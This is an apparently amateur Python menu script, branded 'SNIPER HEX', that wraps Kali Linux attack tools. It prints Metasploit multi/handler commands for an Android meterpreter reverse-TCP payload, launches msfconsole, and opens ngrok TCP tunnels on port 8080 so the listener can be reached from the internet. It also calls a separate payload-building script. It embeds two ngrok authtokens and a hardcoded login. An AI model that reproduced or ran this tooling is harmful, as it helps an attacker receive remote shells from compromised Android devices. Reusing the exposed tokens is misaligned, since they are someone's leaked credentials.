
#=======<>=======#

# sudo apt-get install python

# python3 My_Script_Hacking.py

#=======<>=======#

import os

#=======<>=======#

R = '\033[1;31m' #RED

Y = '\033[1;33m' #YELLOW

G = '\033[2;33m' #GREEN

B = '\033[2;34m' #BLUE

#=======<>=======#

os.system('chmod +x ngrok')
os.system('chmod +x Work_A_Payloads.sh')
os.system('clear')
print (Y+'                        ')
print (R+'                        ')
print (Y+'                        ')
print (R+'      ____   __  __     ')
print (Y+'     / ___|  \ \/ /     ')
print (R+'     \___ \   \  /      ')
print (Y+'      ___) |  /  \      ')
print (R+'     |____/  /_/\_\     ')
print (Y+'                        S',R+'N',Y+'I',R+'P',Y+'E',R+'R',Y+' ',Y+'H',R+'E',Y+'X')
print (R+'                        ')
print (Y+'                        ')
print (R+'                        ')
print (Y+'      #=======<>=======#             ')
print (R+'                        ')
print (Y+'                        ')

#=======<>=======#

user = input (R+' Enter Your User Name: ')
if user == 'SX':
        print ('')
        print (G+' Welcome ')
        print ('')

#=======<>=======#

password = input (R+' Enter Your Password: ')
if password == '01152':

            print ('')
            print (' [1] (KALI LINUX) Commands To Open The Hacking Session ')
            print (' [2] (KALI LINUX) Run Tool The Metasploit ')
            print (' [3] (KALI LINUX) Download All Package ')
            print (' [4] (KALI LINUX) Run Tool The Ngrok ')
            print (' [5] (KALI LINUX) Work A Payloads ')
            print (' [6] Exit My Tool ')
            print ('')
choose = input (Y+' Choose Your Numper: ')

#=======<>=======#

if choose == '1':

         os.system('clear')
         print (' [1] use exploit/multi/handler ')
         print (' [2] set payload android/meterpreter/reverse_tcp ')
         print (' [3] set lhost 127.0.0.1 ')
         print (' [4] set lport 8080 ')
         print (' [5] exploit ')

#=======<>=======#

if choose == '2':

         os.system('clear')
         os.system('sudo msfdb init && msfconsole')

#=======<>=======#

if choose == '3':

         os.system('clear')
         os.system('sudo apt-get install root-repo')
         os.system('sudo apt-get install x11-repo')
         os.system('sudo apt-get install git')
         os.system('sudo apt-get install python')
         os.system('sudo apt-get install python2')
         os.system('sudo apt-get install python3')
         os.system('sudo apt-get install ruby')
         os.system('sudo apt-get install wget')
         os.system('sudo apt-get install curl')
         os.system('sudo apt-get install zip')
         os.system('sudo apt-get install unzip')
         os.system('sudo apt-get install rabin2')
         os.system('sudo apt-get install cat')
         os.system('sudo apt-get install nano')
         os.system('sudo apt-get install nmap')
         os.system('sudo apt-get install figlet')
         os.system('clear')
         print (G+' Done Download All Package ')

#=======<>=======#

if choose == '4':

         os.system('clear')
         print ('')
         print (' [1] THE KING ')
         print (' [2] SNIPER HEX ')
         print ('')
         choosetwo = input (Y+' Choose Your Numper: ')

         if choosetwo == '1':

                  os.system('./ngrok authtoken 27yvIwuX6bvriZEIqbvuYKc6dvo_6kbzp35uUexquiYWfPboe')
                  os.system('./ngrok tcp 8080')

         if choosetwo == '2':

                  os.system('./ngrok authtoken 22p9R1zPfJJheu0gPwtdvfn2g3i_hci3ocHbB5qYMCE39JB7')
                  os.system('./ngrok tcp 8080')

#=======<>=======#

if choose == '5':

         os.system('bash Work_A_Payloads.sh')

#=======<>=======#

if choose == '6':

         os.system('clear && exit')

#=======<>=======#
